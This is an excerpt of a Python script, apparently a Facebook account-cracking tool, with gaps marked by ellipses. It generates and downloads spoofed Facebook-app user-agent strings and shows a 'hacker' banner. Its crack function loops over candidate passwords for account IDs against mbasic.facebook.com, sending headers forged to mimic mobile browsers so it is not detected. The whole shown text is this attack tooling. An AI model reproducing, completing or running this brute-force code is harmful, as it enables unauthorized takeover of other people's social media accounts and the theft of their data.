...
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X677 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6723.24 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/486.0.0.66.70;IABMV/1;]''‚]
...
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21D61 [FBAN/FBIOS;FBAV/456.0.0.43.107;FBBV/578727508;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/17.3.1;FBSS/2;FBID/phone;FBLC/nl_NL;FBOP/5;FBRV/581194589]",]
...
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64",]
ugen2=[]
ugen=[]
cokbrut=[]
...
for d in range(5):
    # Generate a UA string for `ugen`
    a = 'Mozilla/5.0 (Linux; Android'
    b = random.choice(['8','9','10','11','12','13','14','15'])
    c = 'RMX3851 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d = random.randrange(40,129)
    e = '0'
...
def uaku():
	try:
		...
		a=requests.get('https://github.com/MAMA-KING-143/Mama/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
\033[0;92m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝   \033[0;92m               
  \033[0;92m═════════════════════════════════════════════
\033[0;92m • CEO PAPI HACKER XRAFAT   FIRE (🥰)
...
def login():
	...
	if MAMA in ['m']:
		...
		os.system('xdg-open https://wa.me/+8801321853247')
	elif MAMA in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.flush()
	ua = "Mozilla/5.0 (Linux; Android 13; RMX3085 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.146 Mobile Safari/537.36"
	...
	for pw in pwv:
		try:
			...
			ses.headers.update({"Host": 'mbasic.facebook.com',"dpr": "3","sec-ch-ua": "\"Chromium\";v\u003d\"128\", \"Not;A\u003dBrand\";v\u003d\"24\", \"Android WebView\";v\u003d\"128\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","sec-ch-ua-platform-version": "\"\"","sec-ch-ua-model": "\"\"","sec-ch-ua-full-version-list": "","sec-ch-prefers-color-scheme": "light","upgrade-insecure-requests": "1","user-agent":ua2,"accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","dnt": "1","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","accept-encoding": "gzip, deflate, br, zstd","accept-language": "en-GB,en-US;q\u003d0.9,en;q\u003d0.8"})
			...
			heade = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'dark', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
